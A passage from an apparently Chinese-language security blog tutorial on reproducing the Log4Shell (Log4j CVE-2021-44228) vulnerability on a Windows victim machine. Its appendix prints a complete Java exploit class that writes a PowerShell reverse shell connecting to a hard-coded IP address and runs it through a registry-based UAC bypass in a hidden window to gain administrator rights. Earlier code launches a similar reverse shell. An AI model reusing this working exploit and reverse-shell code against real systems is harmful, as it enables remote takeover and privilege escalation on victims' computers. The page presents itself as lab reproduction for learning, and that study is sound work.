"-ExecutionPolicy", "Bypass",</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "-Command", payload</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            };</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            ProcessBuilder pb = new ProcessBuilder(command);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            pb.redirectErrorStream(true);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            Process process = pb.start();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            System.out.println("PowerShell reverse shell command executed.");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        } catch (IOException e) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            e.printStackTrace();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">}</span></span><br></span></code></pre></div></div>
<p>要在 Windows 中建立環境，我們可以依據以下步驟來建立環境 :</p>
<ol>
<li>首先到 <a href="https://www.openlogic.com/openjdk-downloads?field_java_parent_version_target_id=416&field_operating_system_target_id=436&field_architecture_target_id=391&field_java_package_target_id=396" target=_blank rel="noopener noreferrer">這個網站</a> 安裝 java-8</li>
<li>接著安裝 <a href=https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar target=_blank rel="noopener noreferrer">log4j-core-2.14.1.jar</a> 和 <a href=https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar target=_blank rel="noopener noreferrer">log4j-api-2.14.1.jar</a></li>
<li>在 powershell 中執行以下指令</li>
</ol>
<div class="language-pwsh codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-pwsh codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">javac -cp "log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp.java</span><br></span></code></pre></div></div>
<div class="language-pwsh codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-pwsh codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=appendix-2--回彈有-admin-權限的-shell>Appendix 2 : 回彈有 Admin 權限的 shell<a href=#appendix-2--回彈有-admin-權限的-shell class=hash-link aria-label="Appendix 2 : 回彈有 Admin 權限的 shell的直接連結" title="Appendix 2 : 回彈有 Admin 權限的 shell的直接連結">​</a></h2>
<p>可以使用 UAC bypass 的方式來取得 Admin 權限，以下是一個簡單的範例 :</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockTitle_OeMC>Exploit.java</div><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-java codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">import java.io.FileWriter;</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">import java.io.IOException;</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">public class Exploit {</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">    static {</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">        try {</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            String host = "104.199.254.153";</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            int port = 8000;</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            // PowerShell payload as a string</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            String payload = String.format(</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "$client = New-Object System.Net.Sockets.TCPClient('%s', %d);" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "$stream = $client.GetStream();" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "$writer = New-Object System.IO.StreamWriter($stream);" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "$reader = New-Object System.IO.StreamReader($stream);" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "$writer.AutoFlush = $true;" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "while ($true) {" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "$command = $reader.ReadLine();" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "if ($command -eq 'exit') { break }" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message };" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "$writer.WriteLine($output);" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "}" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "$client.Close();", host, port);</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            // Write the payload to a .ps1 file</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            String ps1FilePath = System.getProperty("user.home") + "\\reverse_shell.ps1";</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            try (FileWriter fileWriter = new FileWriter(ps1FilePath)) {</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                fileWriter.write(payload);</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            }</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            // Define the UAC bypass function</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            String uacBypassCommand = String.format(</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "function uacbypass { " +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "param($ps1Path) " +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "New-Item -Force -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Value ('powershell -ExecutionPolicy Bypass -WindowStyle hidden -File \"' + $ps1Path + '\"'); " +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "New-ItemProperty -Force -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Name 'DelegateExecute'; " +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "Start-Process -FilePath $env:windir\\system32\\sdclt.exe; " +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "Start-Sleep -s 2; " +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    "Remove-Item -Path 'HKCU:\\Software\\Classes\\Folder' -Recurse;" +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "}; " +</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                // Call uacbypass to execute the .ps1 script</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "uacbypass '%s';", ps1FilePath</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            );</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            // Run the UAC bypass PowerShell command</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            String[] command = {</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "cmd.exe", "/c", "start", "/min", "powershell.exe",</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "-NoProfile",</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "-WindowStyle", "hidden",</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "-ExecutionPolicy", "Bypass",</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                "-Command", uacBypassCommand</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            };</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            ProcessBuilder pb = new ProcessBuilder(command);</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            pb.redirectErrorStream(true);</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            Process process = pb.start();</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            System.out.println("PowerShell reverse shell and UAC bypass executed.");</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">        } catch (IOException e) {</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">            e.printStackTrace();</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">        }</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">    }</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">}</span><br></span></code></pre></div></div>
<p>可以使用以下的指令來確定是否有成功取得 Admin 權限 :</p>
<div class="language-pwsh codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-pwsh codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">[bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=參考>參考<a href=#參考 class=hash-link aria-label=參考的直接連結 title=參考的直接連結>​</a></h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=Fnuky41Eldo" target=_blank rel="noopener noreferrer">CVE-2021-44228-Log4j 漏洞分析及漏洞複現(Log4j POC)</a></li>
<li><a href=https://blog.csdn.net/FisrtBqy/article/details/130680143 target=_blank rel="noopener noreferrer">Log4j2 反序列化漏洞原理与复现</a></li>
<li><a href="https://www.youtube.com/watch?v=kj2v_CQ8sSM" target=_blank rel="noopener noreferrer">Youtube 影片示範</a></li>
</ul></div><div style=margin-top:32px></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class=col><a href=https://github.com/RulerChen/RulerChen-Website/tree/main/docs/Security/log4j.mdx target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_Z9Sw aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>編輯此頁</a></div><div class="col lastUpdated_JAkA"><span class=theme-last-updated>最後<!-- -->於 <b><time datetime=2025-09-07T12:56:30.000Z itemprop=dateModified>2025年9月7日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label=文件選項卡><a class="pagination-nav__link pagination-nav__link--prev" href=/RulerChen-Website/docs/Security/><div class=pagination-nav__sublabel>上一頁</div><div class=pagination-nav__label>Security</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/RulerChen-Website/docs/Security/windowsservice/><div class=pagination-nav__sublabel>下一頁</div><div class=pagination-nav__label>如何使用 C# 創建惡意 Windows 服務來回彈系統權限的 shell</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#概述 class="table-of-contents__link toc-highlight">概述</a><li><a href=#雲端環境 class="table-of-contents__link toc-highlight">雲端環境</a><li><a href=#ldap-主機架設 class="table-of-contents__link toc-highlight">LDAP 主機架設</a><li><a href=#惡意-class-主機架設 class="table-of-contents__link toc-highlight">惡意 class 主機架設</a><li><a href=#reverse-shell-主機架設 class="table-of-contents__link toc-highlight">Reverse Shell 主機架設</a><li><a href=#受害者主機架設 class="table-of-contents__link toc-highlight">受害者主機架設</a><li><a href=#測試 class="table-of-contents__link toc-highlight">測試</a><li><a href=#appendix-1--將-docker-改成-windows-環境 class="table-of-contents__link toc-highlight">Appendix 1 : 將 Docker 改成 Windows 環境</a><li><a href=#appendix-2--回彈有-admin-權限的-shell class="table-of-contents__link toc-highlight">Appendix 2 : 回彈有 Admin 權限的 shell</a><li><a href=#參考 class="table-of-contents__link toc-highlight">參考</a></ul></div></div></div></div></main></div></div></div></div>